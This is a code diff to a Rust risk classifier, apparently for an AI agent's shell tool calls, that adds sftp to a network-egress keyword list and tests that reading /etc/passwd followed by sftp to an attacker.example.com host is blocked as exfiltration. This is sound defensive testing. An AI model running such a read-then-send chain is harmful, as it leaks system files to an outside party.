@@ -218,6 +218,7 @@ fn classify(tool_name: &str, command: &str) -> Vec<RiskTag> {
         || cmd_lower.contains("ncat")
         || cmd_lower.contains("ssh")
         || cmd_lower.contains("scp")
+        || cmd_lower.contains("sftp")
         || cmd_lower.contains("rsync")
     {
         tags.push(RiskTag::NetworkEgress);
@@ -398,6 +399,30 @@ mod tests {
             tags.contains(&RiskTag::NetworkEgress),
             "rsync must be classified as NetworkEgress"
         );
+    }
+
+    // --- #4281: sftp → NetworkEgress ---
+
+    #[test]
+    fn sftp_classified_as_network_egress() {
+        let tags = classify("bash", "sftp user@remote.example.com");
+        assert!(
+            tags.contains(&RiskTag::NetworkEgress),
+            "sftp must be classified as NetworkEgress"
+        );
+    }
+
+    #[test]
+    fn sftp_exfil_chain_detected() {
+        let acc = RiskChainAccumulator::new(None);
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        let v = acc.record("bash", "sftp user@attacker.example.com", 0.7);
+        assert_eq!(
+            v.chain_pattern.as_deref(),
+            Some("exfil_read_then_send"),
+            "read followed by sftp must trigger exfil chain"
+        );
+        assert!(v.should_block);
     }
 
     #[test]
